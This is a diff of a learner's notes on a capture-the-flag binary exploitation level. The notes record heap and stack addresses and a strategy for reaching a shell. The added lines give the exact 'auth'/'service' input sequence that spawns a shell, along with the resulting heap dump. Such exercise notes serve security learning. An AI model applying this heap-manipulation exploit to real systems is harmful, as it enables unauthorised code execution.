@@ -29,7 +29,6 @@
 -> then strcpy(auth, local_8b) -> copy what is on the stack to auth
 
 
-
 /****  R E S E T ****/
 
 -> free auth IF ((!uVar9 && TRUE) == uVar9)
@@ -60,32 +59,44 @@ acStack_89 -> [a]rray [c]haracter [s]tack [89]padding to ebp
 
 
 /******************************/
-/*	   Infos 	      */
+/*	   Strategy 	      */
 /******************************/
 
-python -c 'print "A"*128' => print 2 addresses same time
-(nil, nil)
-
-/****** S T R A T E G Y *****/
 
 -> check stack overflow to overwrite main ret => F A I L 
 
+-> check heap overflow
+-> need to respect (auth + 0x20 != 0)
 
 
-strcpy(auth, local_8b) => generate heap overflow ???
 
--> get addres of auth 
-auth address in heap (first malloc): 0x0804a008
+/******************************/
+/*	   Infos 	      */
+/******************************/
 
--> get address of local_8b
-		address local_8b: 0xbffff6d5
+auth command: max 31 char to be written in heap by auth input
 
-loop 1: 0x0804a008
-loop 2: 0x0804a018
+A D D R E S S E S: 
+-> get addres of [auth, service] spaced by 10: 0x0804a008
+-> get address of local_8b: 0xbffff6d5
 
 
-test with command login:
-"login"
-uVar12 = false
-uVar9 = true
+I N S T R U C T I O N S:
+-> auth should not move 
+-> service create a string from the stack to the heap
+-> to execute shell you need ((int*)auth + 0x20 != 0)
+-> service create data on the heap after auth (auth + 10) and take same stack address as auth local_8b 
+-> test with 'auth' and multiple 'service' to see if you can reach auth+0x20(32) 
+-> it works !!!
 
+auth AAAAAAAAAAAAAAAAAAAAAAAAA
+service
+service
+$ ls
+
+heap: 
+0x804a008:	0x41414141	0x41414141	0x41414141	0x00000011
+0x804a018:	0x4141000a	0x41414141	0x00000a41	0x00000011
+0x804a028:	0x0000000a	0x00000000	0x00000000	0x41414121
+
+auth (0x804a008) + 0x20 = 0x804a028 = 0x0000000a
